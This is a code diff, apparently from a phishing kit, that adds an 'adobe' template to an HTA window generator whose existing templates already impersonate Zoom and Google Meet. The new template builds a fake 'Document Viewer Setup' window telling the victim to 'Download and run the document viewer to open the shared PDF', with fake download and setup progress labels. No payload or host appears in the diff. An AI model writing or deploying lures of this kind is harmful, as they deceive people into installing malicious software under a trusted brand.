@@ -1,7 +1,9 @@
-type InviteTemplate = 'zoom' | 'google_meet';
+type InviteTemplate = 'zoom' | 'google_meet' | 'adobe';
 
 function normalizeTemplate(template?: string | null): InviteTemplate {
-  return template === 'google_meet' ? 'google_meet' : 'zoom';
+  if (template === 'google_meet') return 'google_meet';
+  if (template === 'adobe') return 'adobe';
+  return 'zoom';
 }
 
 interface HtaBrand {
@@ -33,7 +35,8 @@ const MEET_SVG =
   '</svg>';
 
 function htaBrand(template?: string | null): HtaBrand {
-  if (normalizeTemplate(template) === 'google_meet') {
+  const t = normalizeTemplate(template);
+  if (t === 'google_meet') {
     return {
       windowTitle: 'Google Meet',
       applicationName: 'Google Meet',
@@ -53,6 +56,25 @@ function htaBrand(template?: string | null): HtaBrand {
         '<div class="brand-row">' +
         MEET_SVG +
         '<span class="meet-title">Google Meet</span></div>',
+    };
+  }
+  if (t === 'adobe') {
+    return {
+      windowTitle: 'Document Viewer Setup',
+      applicationName: 'Document Viewer',
+      heading: 'Open Document',
+      subheading: 'Download and run the document viewer to open the shared PDF.',
+      downloadLabel: 'Downloading document viewer',
+      installLabel: 'Setting up viewer',
+      accent: '#b22222',
+      accentDark: '#8b0000',
+      pageBg: '#b22222',
+      finishMessage: 'You can close this window and return to your document.',
+      bodyClass: 'adobe',
+      btnRadius: '8px',
+      shellWidth: 500,
+      shellHeight: 360,
+      headerHtml: '<div class="adobe-title">Document Viewer</div>',
     };
   }
   return {
